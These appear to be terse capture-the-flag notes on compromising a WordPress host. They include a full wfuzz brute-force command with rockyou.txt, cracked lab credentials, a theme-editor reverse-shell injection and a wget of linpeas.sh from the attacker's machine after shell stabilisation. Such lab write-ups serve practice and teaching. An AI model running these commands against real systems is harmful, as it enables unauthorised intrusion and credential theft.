Used to tunnel to access Jenkins Server with aubreanna.

Apache httpd 2.4.29
There is a wordpress login site
wfuzz with rockyou.txt finds admin:my2boys
wfuzz -c -u http://10.10.17.116/blog/wp-login.php -d "log=admin&pwd=FUZZ" -z file,/usr/share/wordlists/rockyou.txt --hh 4942
From the login screen I see a note left open that says:
Don't forget to reset Will's credentials. william:arnold147
unable to find a place to use this.
Theme injection
First I tried replacing the php code in the plugin, but the file is not writable.
Then I tried uploading a malicious plugin via metasploit, also not working due to write permissions
Themes are editable
edited Twenty Seventeen’s index.php
Just visited the main page, triggered the rev shell
got a shell!
Reverse Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
cd /tmp
wget http://10.6.15.130:8000/linpeas.sh
chmod +x linpeas.sh
